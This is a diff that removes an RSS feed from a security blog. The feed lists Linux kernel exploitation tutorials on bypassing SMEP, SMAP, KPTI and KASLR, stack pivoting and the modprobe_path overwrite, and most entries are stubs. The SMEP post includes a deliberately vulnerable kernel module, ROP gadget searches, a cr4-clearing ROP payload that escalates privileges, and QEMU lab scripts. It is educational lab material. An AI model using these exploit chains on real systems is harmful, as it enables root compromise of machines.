@@ -1,483 +1,4 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Anvbis</title><link>https://anvbis.github.io/</link><description>Recent content on Anvbis</description><generator>Hugo -- gohugo.io</generator><language>en-au</language><copyright>Anvbis</copyright><lastBuildDate>Mon, 31 Jan 2022 00:00:00 +0000</lastBuildDate><atom:link href="https://anvbis.github.io/index.xml" rel="self" type="application/rss+xml"/><item><title>Linux Kernel 0x07 :: Modprobe Path Overwrite</title><link>https://anvbis.github.io/posts/linux-kernel-7-modprobe-path/</link><pubDate>Mon, 31 Jan 2022 00:00:00 +0000</pubDate><guid>https://anvbis.github.io/posts/linux-kernel-7-modprobe-path/</guid><description>Table of Contents Modprobe Path Overview Overwriting Modprobe Path A Vulnerable Kernel Module Environment Setup Building the Exploit Escalating Privileges Modprobe Path Overview &amp;hellip;
-Overwriting Modprobe Path &amp;hellip;
-A Vulnerable kernel Module &amp;hellip;
-Environment Setup &amp;hellip;
-Building the Exploit &amp;hellip;
-Escalating Privileges &amp;hellip;
-Appendix Linux Kernel Exploitation Technique - Overwriting modprobe_path</description><content>&lt;h2 id="table-of-contents">Table of Contents&lt;/h2>
-&lt;ol>
-&lt;li>&lt;a href="#modprobe-path-overview">Modprobe Path Overview&lt;/a>&lt;/li>
-&lt;li>&lt;a href="#overwriting-modprobe-path">Overwriting Modprobe Path&lt;/a>&lt;/li>
-&lt;li>&lt;a href="#a-vulnerable-kernel-module">A Vulnerable Kernel Module&lt;/a>&lt;/li>
-&lt;li>&lt;a href="#environment-setup">Environment Setup&lt;/a>&lt;/li>
-&lt;li>&lt;a href="#building-the-exploit">Building the Exploit&lt;/a>&lt;/li>
-&lt;li>&lt;a href="#escalating-privileges">Escalating Privileges&lt;/a>&lt;/li>
-&lt;/ol>
-&lt;h2 id="modprobe-path-overview">Modprobe Path Overview&lt;/h2>
-&lt;p>&amp;hellip;&lt;/p>
-&lt;h2 id="overwriting-modprobe-path">Overwriting Modprobe Path&lt;/h2>
-&lt;p>&amp;hellip;&lt;/p>
-&lt;h2 id="a-vulnerable-kernel-module">A Vulnerable kernel Module&lt;/h2>
-&lt;p>&amp;hellip;&lt;/p>
-&lt;h2 id="environment-setup">Environment Setup&lt;/h2>
-&lt;p>&amp;hellip;&lt;/p>
-&lt;h2 id="building-the-exploit">Building the Exploit&lt;/h2>
-&lt;p>&amp;hellip;&lt;/p>
-&lt;h2 id="escalating-privileges">Escalating Privileges&lt;/h2>
-&lt;p>&amp;hellip;&lt;/p>
-&lt;h2 id="appendix">Appendix&lt;/h2>
-&lt;ul>
-&lt;li>&lt;a href="https://lkmidas.github.io/posts/20210223-linux-kernel-pwn-modprobe/">Linux Kernel Exploitation Technique - Overwriting modprobe_path&lt;/a>&lt;/li>
-&lt;/ul></content></item><item><title>Linux Kernel 0x06 :: Stack Pivot in the Kernel</title><link>https://anvbis.github.io/posts/linux-kernel-6-stack-pivot/</link><pubDate>Sun, 30 Jan 2022 00:00:00 +0000</pubDate><guid>https://anvbis.github.io/posts/linux-kernel-6-stack-pivot/</guid><description>Table of Contents A Vulnerable Kernel Module Encountering Limited Overflow Space Pivoting the Stack Building a Fake Stack Environment Setup Building the Exploit A Vulnerable Kernel Module &amp;hellip;
-Encountering Limited Overflow Space &amp;hellip;
-Pivoting the Stack &amp;hellip;
-Building a Fake Stack &amp;hellip;
-Environment Setup &amp;hellip;
-Building the Exploit &amp;hellip;
-Appendix Learning Linux Kernel Exploitation - Part 2</description><content>&lt;h2 id="table-of-contents">Table of Contents&lt;/h2>
-&lt;ol>
-&lt;li>&lt;a href="#a-vulnerable-kernel-module">A Vulnerable Kernel Module&lt;/a>&lt;/li>
-&lt;li>&lt;a href="#encountering-limited-overflow-space">Encountering Limited Overflow Space&lt;/a>&lt;/li>
-&lt;li>&lt;a href="#pivoting-the-stack">Pivoting the Stack&lt;/a>&lt;/li>
-&lt;li>&lt;a href="#building-a-fake-stack">Building a Fake Stack&lt;/a>&lt;/li>
-&lt;li>&lt;a href="#environment-setup">Environment Setup&lt;/a>&lt;/li>
-&lt;li>&lt;a href="#building-the-exploit">Building the Exploit&lt;/a>&lt;/li>
-&lt;/ol>
-&lt;h2 id="a-vulnerable-kernel-module">A Vulnerable Kernel Module&lt;/h2>
-&lt;p>&amp;hellip;&lt;/p>
-&lt;h2 id="encountering-limited-overflow-space">Encountering Limited Overflow Space&lt;/h2>
-&lt;p>&amp;hellip;&lt;/p>
-&lt;h2 id="pivoting-the-stack">Pivoting the Stack&lt;/h2>
-&lt;p>&amp;hellip;&lt;/p>
-&lt;h2 id="building-a-fake-stack">Building a Fake Stack&lt;/h2>
-&lt;p>&amp;hellip;&lt;/p>
-&lt;h2 id="environment-setup">Environment Setup&lt;/h2>
-&lt;p>&amp;hellip;&lt;/p>
-&lt;h2 id="building-the-exploit">Building the Exploit&lt;/h2>
-&lt;p>&amp;hellip;&lt;/p>
-&lt;h2 id="appendix">Appendix&lt;/h2>
-&lt;ul>
-&lt;li>&lt;a href="https://lkmidas.github.io/posts/20210128-linux-kernel-pwn-part-2/">Learning Linux Kernel Exploitation - Part 2&lt;/a>&lt;/li>
-&lt;/ul></content></item><item><title>Linux Kernel 0x05 :: Bypass KASLR with Pointer Leak</title><link>https://anvbis.github.io/posts/linux-kernel-5-bypass-kaslr/</link><pubDate>Sat, 29 Jan 2022 00:00:00 +0000</pubDate><guid>https://anvbis.github.io/posts/linux-kernel-5-bypass-kaslr/</guid><description>Table of Contents Overview of Kernel Address-Space Layout Randomization Bypass Techniques A Vulnerable Kernel Module Leaking a Kernel Pointer Building an Escalation Chain Environment Setup Building the Exploit Overview of Kernel Address-Space Layout Randomization &amp;hellip;
-Bypass Techniques &amp;hellip;
-A Vulnerable Kernel Module &amp;hellip;
-Leaking a Kernel Pointer &amp;hellip;
-Building an Escalation Chain &amp;hellip;
-Environment Setup &amp;hellip;
-Building the Exploit &amp;hellip;
-Appendix Learning Linux Kernel Exploitation - Part 2</description><content>&lt;h2 id="table-of-contents">Table of Contents&lt;/h2>
-&lt;ol>
-&lt;li>&lt;a href="#overview-of-kernel-address-space-layout-randomization">Overview of Kernel Address-Space Layout Randomization&lt;/a>&lt;/li>
-&lt;li>&lt;a href="#bypass-techniques">Bypass Techniques&lt;/a>&lt;/li>
-&lt;li>&lt;a href="#a-vulnerable-kernel-module">A Vulnerable Kernel Module&lt;/a>&lt;/li>
-&lt;li>&lt;a href="#leaking-a-kernel-pointer">Leaking a Kernel Pointer&lt;/a>&lt;/li>
-&lt;li>&lt;a href="#building-an-escalation-chain">Building an Escalation Chain&lt;/a>&lt;/li>
-&lt;li>&lt;a href="#environment-setup">Environment Setup&lt;/a>&lt;/li>
-&lt;li>&lt;a href="#building-the-exploit">Building the Exploit&lt;/a>&lt;/li>
-&lt;/ol>
-&lt;h2 id="overview-of-kernel-address-space-layout-randomization">Overview of Kernel Address-Space Layout Randomization&lt;/h2>
-&lt;p>&amp;hellip;&lt;/p>
-&lt;h2 id="bypass-techniques">Bypass Techniques&lt;/h2>
-&lt;p>&amp;hellip;&lt;/p>
-&lt;h2 id="a-vulnerable-kernel-module">A Vulnerable Kernel Module&lt;/h2>
-&lt;p>&amp;hellip;&lt;/p>
-&lt;h2 id="leaking-a-kernel-pointer">Leaking a Kernel Pointer&lt;/h2>
-&lt;p>&amp;hellip;&lt;/p>
-&lt;h2 id="building-an-escalation-chain">Building an Escalation Chain&lt;/h2>
-&lt;p>&amp;hellip;&lt;/p>
-&lt;h2 id="environment-setup">Environment Setup&lt;/h2>
-&lt;p>&amp;hellip;&lt;/p>
-&lt;h2 id="building-the-exploit">Building the Exploit&lt;/h2>
-&lt;p>&amp;hellip;&lt;/p>
-&lt;h2 id="appendix">Appendix&lt;/h2>
-&lt;ul>
-&lt;li>&lt;a href="https://lkmidas.github.io/posts/20210128-linux-kernel-pwn-part-2/">Learning Linux Kernel Exploitation - Part 2&lt;/a>&lt;/li>
-&lt;/ul></content></item><item><title>Linux Kernel 0x04 :: Bypass KPTI with Trampoline</title><link>https://anvbis.github.io/posts/linux-kernel-4-bypass-kpti/</link><pubDate>Fri, 28 Jan 2022 00:00:00 +0000</pubDate><guid>https://anvbis.github.io/posts/linux-kernel-4-bypass-kpti/</guid><description>Table of Contents Overview of Kernel Page-Table Isolation The KPTI Trampoline A Vulnerable Kernel Module Building an Escalation Chain Environment Setup Building the Exploit Overview of Kernel Page-Table Isolation &amp;hellip;
-The KPTI Trampoline &amp;hellip;
-A Vulnerable Kernel Module &amp;hellip;
-Building an Escalation Chain &amp;hellip;
-Environment Setup &amp;hellip;
-Building the Exploit &amp;hellip;
-Appendix Learning Linux Kernel Exploitation - Part 2</description><content>&lt;h2 id="table-of-contents">Table of Contents&lt;/h2>
-&lt;ol>
-&lt;li>&lt;a href="#overview-of-kernel-page-table-isolation">Overview of Kernel Page-Table Isolation&lt;/a>&lt;/li>
-&lt;li>&lt;a href="#the-kpti-trampoline">The KPTI Trampoline&lt;/a>&lt;/li>
-&lt;li>&lt;a href="#a-vulnerable-kernel-module">A Vulnerable Kernel Module&lt;/a>&lt;/li>
-&lt;li>&lt;a href="#building-an-escalation-chain">Building an Escalation Chain&lt;/a>&lt;/li>
-&lt;li>&lt;a href="#environment-setup">Environment Setup&lt;/a>&lt;/li>
-&lt;li>&lt;a href="#building-the-exploit">Building the Exploit&lt;/a>&lt;/li>
-&lt;/ol>
-&lt;h2 id="overview-of-kernel-page-table-isolation">Overview of Kernel Page-Table Isolation&lt;/h2>
-&lt;p>&amp;hellip;&lt;/p>
-&lt;h2 id="the-kpti-trampoline">The KPTI Trampoline&lt;/h2>
-&lt;p>&amp;hellip;&lt;/p>
-&lt;h2 id="a-vulnerable-kernel-module">A Vulnerable Kernel Module&lt;/h2>
-&lt;p>&amp;hellip;&lt;/p>
-&lt;h2 id="building-an-escalation-chain">Building an Escalation Chain&lt;/h2>
-&lt;p>&amp;hellip;&lt;/p>
-&lt;h2 id="environment-setup">Environment Setup&lt;/h2>
-&lt;p>&amp;hellip;&lt;/p>
-&lt;h2 id="building-the-exploit">Building the Exploit&lt;/h2>
-&lt;p>&amp;hellip;&lt;/p>
-&lt;h2 id="appendix">Appendix&lt;/h2>
-&lt;ul>
-&lt;li>&lt;a href="https://lkmidas.github.io/posts/20210128-linux-kernel-pwn-part-2/">Learning Linux Kernel Exploitation - Part 2&lt;/a>&lt;/li>
-&lt;/ul></content></item><item><title>Linux Kernel 0x03 :: Bypass SMAP with SIGSEGV Handler</title><link>https://anvbis.github.io/posts/linux-kernel-3-bypass-smep/</link><pubDate>Thu, 27 Jan 2022 00:00:00 +0000</pubDate><guid>https://anvbis.github.io/posts/linux-kernel-3-bypass-smep/</guid><description>Table of Contents Overview of Supervisor Mode Access Prevention SMAP Bypass Techniques A Vulnerable Kernel Module Building a Complete Escalation Chain Environment Setup Building the Exploit Overview of Supervisor Mode Access Prevention &amp;hellip;
-SMAP Bypass Techniques &amp;hellip;
-A Vulnerable Kernel Module &amp;hellip;
-Building a Complete Escalation Chain &amp;hellip;
-Environment Setup &amp;hellip;
-Building the Exploit &amp;hellip;
-Appendix Learning Linux Kernel Exploitation - Part 2</description><content>&lt;h2 id="table-of-contents">Table of Contents&lt;/h2>
-&lt;ol>
-&lt;li>&lt;a href="#overview-of-supervisor-mode-access-prevention">Overview of Supervisor Mode Access Prevention&lt;/a>&lt;/li>
-&lt;li>&lt;a href="#smap-bypass-techniques">SMAP Bypass Techniques&lt;/a>&lt;/li>
-&lt;li>&lt;a href="#a-vulnerable-kernel-module">A Vulnerable Kernel Module&lt;/a>&lt;/li>
-&lt;li>&lt;a href="#building-a-complete-escalation-chain">Building a Complete Escalation Chain&lt;/a>&lt;/li>
-&lt;li>&lt;a href="#environment-setup">Environment Setup&lt;/a>&lt;/li>
-&lt;li>&lt;a href="#building-the-exploit">Building the Exploit&lt;/a>&lt;/li>
-&lt;/ol>
-&lt;h2 id="overview-of-supervisor-mode-access-prevention">Overview of Supervisor Mode Access Prevention&lt;/h2>
-&lt;p>&amp;hellip;&lt;/p>
-&lt;h2 id="smap-bypass-techniques">SMAP Bypass Techniques&lt;/h2>
-&lt;p>&amp;hellip;&lt;/p>
-&lt;h2 id="a-vulnerable-kernel-module">A Vulnerable Kernel Module&lt;/h2>
-&lt;p>&amp;hellip;&lt;/p>
-&lt;h2 id="building-a-complete-escalation-chain">Building a Complete Escalation Chain&lt;/h2>
-&lt;p>&amp;hellip;&lt;/p>
-&lt;h2 id="environment-setup">Environment Setup&lt;/h2>
-&lt;p>&amp;hellip;&lt;/p>
-&lt;h2 id="building-the-exploit">Building the Exploit&lt;/h2>
-&lt;p>&amp;hellip;&lt;/p>
-&lt;h2 id="appendix">Appendix&lt;/h2>
-&lt;ul>
-&lt;li>&lt;a href="https://lkmidas.github.io/posts/20210128-linux-kernel-pwn-part-2/">Learning Linux Kernel Exploitation - Part 2&lt;/a>&lt;/li>
-&lt;/ul></content></item><item><title>Linux Kernel 0x02 :: Bypass SMEP with CR4 Overwrite</title><link>https://anvbis.github.io/posts/linux-kernel-2-bypass-smep/</link><pubDate>Wed, 26 Jan 2022 00:00:00 +0000</pubDate><guid>https://anvbis.github.io/posts/linux-kernel-2-bypass-smep/</guid><description>Table of Contents Overview of SMEP Overwriting the Control Register A Vulnerable Kernel Module Building a ROP Chain Environment Setup Building the Exploit Overview of SMEP Supervisor mode execution protection (SMEP) is a kernel exploit mitigation feature that marks all user-space memory pages as non-executable. This means we can still read/write to user-space memory, but we are unable to execute any code stored in user-space. You can think of this as the equivalent of kernel-space DEP.</description><content>&lt;h2 id="table-of-contents">Table of Contents&lt;/h2>
-&lt;ol>
-&lt;li>&lt;a href="#overview-of-smep">Overview of SMEP&lt;/a>&lt;/li>
-&lt;li>&lt;a href="#overwriting-the-control-register">Overwriting the Control Register&lt;/a>&lt;/li>
-&lt;li>&lt;a href="#a-vulnerable-kernel-module">A Vulnerable Kernel Module&lt;/a>&lt;/li>
-&lt;li>&lt;a href="#building-a-rop-chain">Building a ROP Chain&lt;/a>&lt;/li>
-&lt;li>&lt;a href="#environment-setup">Environment Setup&lt;/a>&lt;/li>
-&lt;li>&lt;a href="#building-the-exploit">Building the Exploit&lt;/a>&lt;/li>
-&lt;/ol>
-&lt;h2 id="overview-of-smep">Overview of SMEP&lt;/h2>
-&lt;p>Supervisor mode execution protection (SMEP) is a kernel exploit mitigation feature that marks all user-space memory pages as non-executable. This means we can still read/write to user-space memory, but we are unable to execute any code stored in user-space. You can think of this as the equivalent of kernel-space DEP.&lt;/p>
-&lt;p>In the kernel, SMEP is enabled by setting the 20th bit of the control register, &lt;code>cr4&lt;/code>. We can potentially bypass this exploit mitigation by unsetting this bit.&lt;/p>
-&lt;p>As we cannot execute code in user-space, we&amp;rsquo;ll need to find some other way to control process execution. We can do this via return-oriented programming (ROP).&lt;/p>
-&lt;p>Note: Attempting to overwrite the &lt;code>cr4&lt;/code> register in newer kernel versions will cause the kernel to panic. This is as newer kernels attempt to &amp;lsquo;pin&amp;rsquo; the sensitive bits in the &lt;code>cr4&lt;/code> and &lt;code>cr0&lt;/code> registers, detecting any changes made to them as an exploit mitigation feature.&lt;/p>
-&lt;h2 id="overwriting-the-control-register">Overwriting the Control Register&lt;/h2>
-&lt;p>To overwrite the value of the &lt;code>cr4&lt;/code> register, we can use a kernel-space function called &lt;code>native_write_cr4&lt;/code>. We can find the address of this function by reading &lt;code>/proc/kallsyms&lt;/code>.&lt;/p>
-&lt;pre>&lt;code>/ # cat /proc/kallsyms | grep native_write_cr4
-ffffffff814443e0 T native_write_cr4
-&lt;/code>&lt;/pre>&lt;p>Whatever value is passed into &lt;code>native_write_cr4&lt;/code> will replace the value of the &lt;code>cr4&lt;/code> register. Meaning we can modify the bit that enables SMEP protections in kernel-space.&lt;/p>
-&lt;h2 id="a-vulnerable-kernel-module">A Vulnerable Kernel Module&lt;/h2>
-&lt;p>We can use the same vulnerable kernel module as in the return to user-space post to demonstrate this technique. This kernel module has buffer overflow vulnerabilities in both its &lt;code>challenge_read&lt;/code> and &lt;code>challenge_write&lt;/code> function handlers.&lt;/p>
-&lt;p>For an overview of the vulnerabilities present in this kernel module, please read the previous post.&lt;/p>
-&lt;p>&lt;a href="https://anvbis.github.io/files/linux-kernel/2/challenge.c">challenge.c&lt;/a>&lt;/p>
-&lt;div class="collapsable-code">
-&lt;input id="1" type="checkbox" checked />
-&lt;label for="1">
-&lt;span class="collapsable-code__language">c&lt;/span>
-&lt;span class="collapsable-code__title">challenge.c&lt;/span>
-&lt;span class="collapsable-code__toggle" data-label-expand="Show" data-label-collapse="Hide">&lt;/span>
-&lt;/label>
-&lt;pre class="language-c" >&lt;code>
-#include &amp;lt;linux/kernel.h&amp;gt;
-#include &amp;lt;linux/module.h&amp;gt;
-#include &amp;lt;linux/fs.h&amp;gt;
-#include &amp;lt;linux/proc_fs.h&amp;gt;
-#include &amp;lt;linux/uaccess.h&amp;gt;
-MODULE_LICENSE(&amp;#34;GPL&amp;#34;);
-char out[256];
-static ssize_t challenge_read(struct file *fp, char *buf, size_t len, loff_t *off)
-{
-char tmp[128];
-memcpy(out, tmp, len);
-return copy_to_user(buf, out, len);
-}
-static ssize_t challenge_write(struct file *fp, const char *buf, size_t len, loff_t *off)
-{
-char tmp[128];
-if (copy_from_user(out, buf, len))
-return -EINVAL;
-memcpy(tmp, out, len);
-return 0;
-}
-static int challenge_open(struct inode *inode, struct file *fp)
-{
-return 0;
-}
-static int challenge_release(struct inode *inode, struct file *fp)
-{
-return 0;
-}
-static struct file_operations fops = {
-.read = challenge_read,
-.write = challenge_write,
-.open = challenge_open,
-.release = challenge_release
-};
-struct proc_dir_entry *proc_entry;
-int init_module(void)
-{
-proc_entry = proc_create(&amp;#34;challenge&amp;#34;, 0666, NULL, &amp;amp;fops);
-return 0;
-}
-void cleanup_module(void)
-{
-if (proc_entry) {
-proc_remove(proc_entry);
-}
-}
-&lt;/code>&lt;/pre>
-&lt;/div>
-&lt;h2 id="building-a-rop-chain">Building a ROP Chain&lt;/h2>
-&lt;p>&amp;hellip;&lt;/p>
-&lt;pre>&lt;code>~/pwnkernel $ rp++ -f linux-5.0/vmlinux -r 3 --unique | grep 'cr4'
-0xffffffff8103a411: add eax, 0x01A7F8BA ; mov cr4, eax ; mov byte [0xFFFFFFFF82AB9CC8], 0x00000000 ; ret ; (1 found)
-0xffffffff8103a416: mov cr4, eax ; mov byte [0xFFFFFFFF82AB9CC8], 0x00000000 ; ret ; (1 found)
-...
-&lt;/code>&lt;/pre>&lt;p>&amp;hellip;&lt;/p>
-&lt;pre>&lt;code>~/pwnkernel $ rp++ -f linux-5.0/vmlinux -r 1 --unique | grep 'pop rax ; ret'
-0xffffffff8101b8d0: pop rax ; ret ; (66 found)
-...
-&lt;/code>&lt;/pre>&lt;p>&amp;hellip;&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">overflow_buffer&lt;/span>(&lt;span style="color:#66d9ef">int&lt;/span> fd, &lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> canary)
-{
-&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> payload[&lt;span style="color:#ae81ff">21&lt;/span>];
-payload[&lt;span style="color:#ae81ff">16&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> canary;
-payload[&lt;span style="color:#ae81ff">17&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0xffffffff8101b8d0&lt;/span>; &lt;span style="color:#75715e">// pop rax ; ret
-&lt;/span>&lt;span style="color:#75715e">&lt;/span> payload[&lt;span style="color:#ae81ff">18&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x6f0&lt;/span>; &lt;span style="color:#75715e">// rax = 0x6f0
-&lt;/span>&lt;span style="color:#75715e">&lt;/span> payload[&lt;span style="color:#ae81ff">19&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0xffffffff8103a416&lt;/span>; &lt;span style="color:#75715e">// mov cr4, eax ; ... ; ret
-&lt;/span>&lt;span style="color:#75715e">&lt;/span>
-payload[&lt;span style="color:#ae81ff">20&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span>)escalate_privileges;
-write(fd, payload, &lt;span style="color:#66d9ef">sizeof&lt;/span>(&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span>) &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">21&lt;/span>);
-}
-&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="environment-setup">Environment Setup&lt;/h2>
-&lt;p>&amp;hellip;&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">&lt;span style="color:#75715e">#!/bin/bash -e
-&lt;/span>&lt;span style="color:#75715e">&lt;/span>
-export KERNEL_VERSION&lt;span style="color:#f92672">=&lt;/span>4.4
-export BUSYBOX_VERSION&lt;span style="color:#f92672">=&lt;/span>1.32.0
-...
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>You can find the whole &lt;code>build.sh&lt;/code> script in the code snippet below.&lt;/p>
-&lt;div class="collapsable-code">
-&lt;input id="1" type="checkbox" checked />
-&lt;label for="1">
-&lt;span class="collapsable-code__language">sh&lt;/span>
-&lt;span class="collapsable-code__title">build.sh&lt;/span>
-&lt;span class="collapsable-code__toggle" data-label-expand="Show" data-label-collapse="Hide">&lt;/span>
-&lt;/label>
-&lt;pre class="language-sh" >&lt;code>
-#!/bin/bash -e
-export KERNEL_VERSION=4.4
-export BUSYBOX_VERSION=1.32.0
-#
-# dependencies
-#
-echo &amp;#34;[&amp;#43;] Checking / installing dependencies...&amp;#34;
-sudo apt-get -q update
-sudo apt-get -q install -y bison flex libelf-dev cpio build-essential libssl-dev qemu-system-x86
-#
-# linux kernel
-#
-echo &amp;#34;[&amp;#43;] Downloading kernel...&amp;#34;
-wget -q -c https://mirrors.edge.kernel.org/pub/linux/kernel/v5.x/linux-$KERNEL_VERSION.tar.gz
-[ -e linux-$KERNEL_VERSION ] || tar xzf linux-$KERNEL_VERSION.tar.gz
-echo &amp;#34;[&amp;#43;] Building kernel...&amp;#34;
-make -C linux-$KERNEL_VERSION defconfig
-echo &amp;#34;CONFIG_NET_9P=y&amp;#34; &amp;gt;&amp;gt; linux-$KERNEL_VERSION/.config
-echo &amp;#34;CONFIG_NET_9P_DEBUG=n&amp;#34; &amp;gt;&amp;gt; linux-$KERNEL_VERSION/.config
-echo &amp;#34;CONFIG_9P_FS=y&amp;#34; &amp;gt;&amp;gt; linux-$KERNEL_VERSION/.config
-echo &amp;#34;CONFIG_9P_FS_POSIX_ACL=y&amp;#34; &amp;gt;&amp;gt; linux-$KERNEL_VERSION/.config
-echo &amp;#34;CONFIG_9P_FS_SECURITY=y&amp;#34; &amp;gt;&amp;gt; linux-$KERNEL_VERSION/.config
-echo &amp;#34;CONFIG_NET_9P_VIRTIO=y&amp;#34; &amp;gt;&amp;gt; linux-$KERNEL_VERSION/.config
-echo &amp;#34;CONFIG_VIRTIO_PCI=y&amp;#34; &amp;gt;&amp;gt; linux-$KERNEL_VERSION/.config
-echo &amp;#34;CONFIG_VIRTIO_BLK=y&amp;#34; &amp;gt;&amp;gt; linux-$KERNEL_VERSION/.config
-echo &amp;#34;CONFIG_VIRTIO_BLK_SCSI=y&amp;#34; &amp;gt;&amp;gt; linux-$KERNEL_VERSION/.config
-echo &amp;#34;CONFIG_VIRTIO_NET=y&amp;#34; &amp;gt;&amp;gt; linux-$KERNEL_VERSION/.config
-echo &amp;#34;CONFIG_VIRTIO_CONSOLE=y&amp;#34; &amp;gt;&amp;gt; linux-$KERNEL_VERSION/.config
-echo &amp;#34;CONFIG_HW_RANDOM_VIRTIO=y&amp;#34; &amp;gt;&amp;gt; linux-$KERNEL_VERSION/.config
-echo &amp;#34;CONFIG_DRM_VIRTIO_GPU=y&amp;#34; &amp;gt;&amp;gt; linux-$KERNEL_VERSION/.config
-echo &amp;#34;CONFIG_VIRTIO_PCI_LEGACY=y&amp;#34; &amp;gt;&amp;gt; linux-$KERNEL_VERSION/.config
-echo &amp;#34;CONFIG_VIRTIO_BALLOON=y&amp;#34; &amp;gt;&amp;gt; linux-$KERNEL_VERSION/.config
-echo &amp;#34;CONFIG_VIRTIO_INPUT=y&amp;#34; &amp;gt;&amp;gt; linux-$KERNEL_VERSION/.config
-echo &amp;#34;CONFIG_CRYPTO_DEV_VIRTIO=y&amp;#34; &amp;gt;&amp;gt; linux-$KERNEL_VERSION/.config
-echo &amp;#34;CONFIG_BALLOON_COMPACTION=y&amp;#34; &amp;gt;&amp;gt; linux-$KERNEL_VERSION/.config
-echo &amp;#34;CONFIG_PCI=y&amp;#34; &amp;gt;&amp;gt; linux-$KERNEL_VERSION/.config
-echo &amp;#34;CONFIG_PCI_HOST_GENERIC=y&amp;#34; &amp;gt;&amp;gt; linux-$KERNEL_VERSION/.config
-echo &amp;#34;CONFIG_GDB_SCRIPTS=y&amp;#34; &amp;gt;&amp;gt; linux-$KERNEL_VERSION/.config
-echo &amp;#34;CONFIG_DEBUG_INFO=y&amp;#34; &amp;gt;&amp;gt; linux-$KERNEL_VERSION/.config
-echo &amp;#34;CONFIG_DEBUG_INFO_REDUCED=n&amp;#34; &amp;gt;&amp;gt; linux-$KERNEL_VERSION/.config
-echo &amp;#34;CONFIG_DEBUG_INFO_SPLIT=n&amp;#34; &amp;gt;&amp;gt; linux-$KERNEL_VERSION/.config
-echo &amp;#34;CONFIG_DEBUG_FS=y&amp;#34; &amp;gt;&amp;gt; linux-$KERNEL_VERSION/.config
-echo &amp;#34;CONFIG_DEBUG_INFO_DWARF4=y&amp;#34; &amp;gt;&amp;gt; linux-$KERNEL_VERSION/.config
-echo &amp;#34;CONFIG_DEBUG_INFO_BTF=y&amp;#34; &amp;gt;&amp;gt; linux-$KERNEL_VERSION/.config
-echo &amp;#34;CONFIG_FRAME_POINTER=y&amp;#34; &amp;gt;&amp;gt; linux-$KERNEL_VERSION/.config
-make -C linux-$KERNEL_VERSION -j16 bzImage
-#
-# Busybox
-#
-echo &amp;#34;[&amp;#43;] Downloading busybox...&amp;#34;
-wget -q -c https://busybox.net/downloads/busybox-$BUSYBOX_VERSION.tar.bz2
-[ -e busybox-$BUSYBOX_VERSION ] || tar xjf busybox-$BUSYBOX_VERSION.tar.bz2
-echo &amp;#34;[&amp;#43;] Building busybox...&amp;#34;
-make -C busybox-$BUSYBOX_VERSION defconfig
-sed -i &amp;#39;s/# CONFIG_STATIC is not set/CONFIG_STATIC=y/g&amp;#39; busybox-$BUSYBOX_VERSION/.config
-make -C busybox-$BUSYBOX_VERSION -j16
-make -C busybox-$BUSYBOX_VERSION install
-#
-# filesystem
-#
-echo &amp;#34;[&amp;#43;] Building filesystem...&amp;#34;
-cd fs
-mkdir -p bin sbin etc proc sys usr/bin usr/sbin root home/ctf
-cd ..
-cp -a busybox-$BUSYBOX_VERSION/_install/* fs
-#
-# modules
-#
-echo &amp;#34;[&amp;#43;] Building modules...&amp;#34;
-cd src
-make
-cd ..
-cp src/*.ko fs/
-&lt;/code>&lt;/pre>
-&lt;/div>
-&lt;p>Taking our &lt;code>launch.sh&lt;/code> script from the previous Linux kernel exploitation post (return to user-space), all we need to add is a line with the &lt;code>+smep&lt;/code> flag.&lt;/p>
-&lt;p>Note that we will also need to update the path to the kernel image (as we are using Linux 4.4 instead of Linux 5.4).&lt;/p>
-&lt;div class="collapsable-code">
-&lt;input id="2" type="checkbox" />
-&lt;label for="2">
-&lt;span class="collapsable-code__language">sh&lt;/span>
-&lt;span class="collapsable-code__title">launch.sh&lt;/span>
-&lt;span class="collapsable-code__toggle" data-label-expand="Show" data-label-collapse="Hide">&lt;/span>
-&lt;/label>
-&lt;pre class="language-sh" >&lt;code>
-#!/bin/bash
-# build root fs
-pushd fs
-find . -print0 | cpio --null -ov --format=newc | gzip -9 &amp;gt; ../initramfs.cpio.gz
-popd
-# launch
-/usr/bin/qemu-system-x86_64 \
--kernel linux-4.4/arch/x86/boot/bzImage \
--initrd $PWD/initramfs.cpio.gz \
--fsdev local,security_model=passthrough,id=fsdev0,path=$HOME \
--device virtio-9p-pci,id=fs0,fsdev=fsdev0,mount_tag=hostshare \
--nographic \
--monitor none \
--s \
--cpu kvm64,&amp;#43;smep \
--append &amp;#34;console=ttyS0 nokaslr nopti quiet&amp;#34;
-&lt;/code>&lt;/pre>
-&lt;/div>
-&lt;p>We can run this script like before in order to be dropped into a root shell on our kernel emulator.&lt;/p>
-&lt;h2 id="building-the-exploit">Building the Exploit&lt;/h2>
-&lt;p>&amp;hellip;&lt;/p>
-&lt;div class="collapsable-code">
-&lt;input id="3" type="checkbox" checked />
-&lt;label for="3">
-&lt;span class="collapsable-code__language">c&lt;/span>
-&lt;span class="collapsable-code__title">exploit.c&lt;/span>
-&lt;span class="collapsable-code__toggle" data-label-expand="Show" data-label-collapse="Hide">&lt;/span>
-&lt;/label>
-&lt;pre class="language-c" >&lt;code>
-#include &amp;lt;stdio.h&amp;gt;
